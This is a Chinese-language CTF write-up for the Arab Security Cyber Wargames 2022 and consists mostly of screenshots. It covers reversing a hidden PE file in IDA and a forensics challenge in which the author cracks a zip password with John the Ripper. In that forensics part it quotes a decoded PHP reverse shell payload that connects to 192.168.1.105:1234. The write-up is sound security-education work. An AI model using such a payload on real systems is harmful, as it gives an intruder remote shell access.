---
title: 'ASCWG CTF 2022 Writeup'
date: '2022-08-10'
tags: ['Writeup']
draft: false
summary: '本文为Arab Security Cyber Wargames 2022比赛的WriteUp。作为阿拉伯国家的CTF比赛，发现中东地区的网络安全氛围也是非常好，交流中可以学习到很多。最终我们在737支参赛队伍排名第67位。  Sometimes you win, sometimes you learn.'
---
...
![1-1-1](/static/images/ASCWG-2022-WriteUp/1-1-1.png)

![img](/static/images/ASCWG-2022-WriteUp/Ad5EXRN42DyBWy38v8uwGA.png)
...
![1-2-1](/static/images/ASCWG-2022-WriteUp/1-2-1.png)
...
![img](/static/images/ASCWG-2022-WriteUp/borgOLBQxPZepYHuRwcHdA.png)
...
![1-3-1](/static/images/ASCWG-2022-WriteUp/1-3-1.png)
...
![2-1-1](/static/images/ASCWG-2022-WriteUp/2-1-1.png)
...
![2-1-2](/static/images/ASCWG-2022-WriteUp/2-1-2.png)下图为pdata结构体读取的内容。

![2-1-3](/static/images/ASCWG-2022-WriteUp/2-1-3.png)

之后的内容，也是一个exe文件的头的格式，既然运行loadexe的方式行不通，我选择先将隐藏exe文件的内容复制为新的文件，再用ida对其进行反编译。

![2-1-4](/static/images/ASCWG-2022-WriteUp/2-1-4.png)

![2-1-5](/static/images/ASCWG-2022-WriteUp/2-1-5.png)
...
![2-1-6](/static/images/ASCWG-2022-WriteUp/2-1-6.png)

![2-1-7](/static/images/ASCWG-2022-WriteUp/2-1-7.png)
...
![2-2-1](/static/images/ASCWG-2022-WriteUp/2-2-1.png)
...
![2-2-2](/static/images/ASCWG-2022-WriteUp/2-2-2.png)

![2-2-3](/static/images/ASCWG-2022-WriteUp/2-2-3.png)

![2-2-4](/static/images/ASCWG-2022-WriteUp/2-2-4.png)
...
![2-2-5](/static/images/ASCWG-2022-WriteUp/2-2-5.png)

(\_QWORD)"bbbbb" = 字符串bbbb存放的地址

v8 = 字符串bbbb存放的地址

![2-2-6](/static/images/ASCWG-2022-WriteUp/2-2-6.png)

![2-2-7](/static/images/ASCWG-2022-WriteUp/2-2-7.png)

所以综上分析得出 v8[v9] = v35。所以，问题只要解决v35是什么。

v35 = (\_\_int64)&lpBuffer[10 * i + 66] + lpBuffer[15];

lpBuffer[15] = lpBuffer + 15\*4，该地址存放的内容为 0x 0000 0080h

movsxd rax, dword ptr [rax+3Ch] 可能是跟汇编中 dword ptr 有关，这个地址指向一个双字型数据

(\_\_int64)&lpBuffer[10\*i + 66] = 第[10*i + 66]个元素在内存当中的首地址

但是按照这样的理解，和汇编代码就出现了不一致的情况。

汇编代码反映出来的是lpBuffer[15+10*i +66]，之所以乘28h，是因为0x28h = 40。

![2-2-8](/static/images/ASCWG-2022-WriteUp/2-2-8.png)
...
![2-2-9](/static/images/ASCWG-2022-WriteUp/2-2-9.png)

修改完毕之后，再次运行PE_Anatomy程序之后即能显示出来flag。

![img](/static/images/ASCWG-2022-WriteUp/7fV6FNj7wZGQmIbI4MwT7Q.png)
...
![2-2-10](/static/images/ASCWG-2022-WriteUp/2-2-10.png)

**v34 = (char \*)lpBuffer + lpBuffer[15];**

![2-2-11](/static/images/ASCWG-2022-WriteUp/2-2-11.png)

通过对比汇编，可以发现 我之前对lpBuffer[15]的理解有问题。

![img](/static/images/ASCWG-2022-WriteUp/Ls98ve-KojUPT8YSIU80dQ.png)

正确的理解方式，lpbuffer[15] = lpbuffer + 15\*4（至于这里为什么是15\*4(0x3C)，是因为本身Ipbuffer 是int\*类型的指针，也就是Ipbuffer指向了一个int类型的数组空间，int类型在64位下刚好占32位也就是4个字节。）

![2-2-12](/static/images/ASCWG-2022-WriteUp/2-2-12.png)
...
![3-1-1](/static/images/ASCWG-2022-WriteUp/3-1-1.png)
...
![3-2-1](/static/images/ASCWG-2022-WriteUp/3-2-1.png)
...
![3-3-1](/static/images/ASCWG-2022-WriteUp/3-3-1.png)
...
![img](/static/images/ASCWG-2022-WriteUp/UbS_1YDcMZRQj29_hoSM7A.png)
...
![4-2-1](/static/images/ASCWG-2022-WriteUp/4-2-1.png)

url解码后得到： `$sock=fsockopen("192.168.1.105",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`

![img](/static/images/ASCWG-2022-WriteUp/WMaNDf7LSLeQVfBmB0sTNg.png)
...
![img](/static/images/ASCWG-2022-WriteUp/IXdUghkTarBPTqgqYnmGZw.png)

发现了一个有密码的zip文件，其中含有Flag.txt文件。一开始观察zip文件发现其是真加密，并不是考察zip伪加密。所以我们开始打开硬盘下的所有隐藏文件开始寻找zip的密码。但是把所有看似像密码的的字符串尝试后发现都无法打开zip文件。

![4-2-2](/static/images/ASCWG-2022-WriteUp/4-2-2.png)

最后决定爆破zip文件。这里采用的是John the Ripper密码破解工具，词表选择rockyou.txt，很快就爆破出了密码。

![img](/static/images/ASCWG-2022-WriteUp/mo97SQOJxtMKDKZS9IJQ0Q.png) ![img](/static/images/ASCWG-2022-WriteUp/5K_WPrmLAyFNN6rq1-AMxw.png)
...
![medium-challenge](/static/images/ASCWG-2022-WriteUp/medium-challenge.png)
...
![](/static/images/ASCWG-2022-WriteUp/Persistent%20Ghost-S2.png)
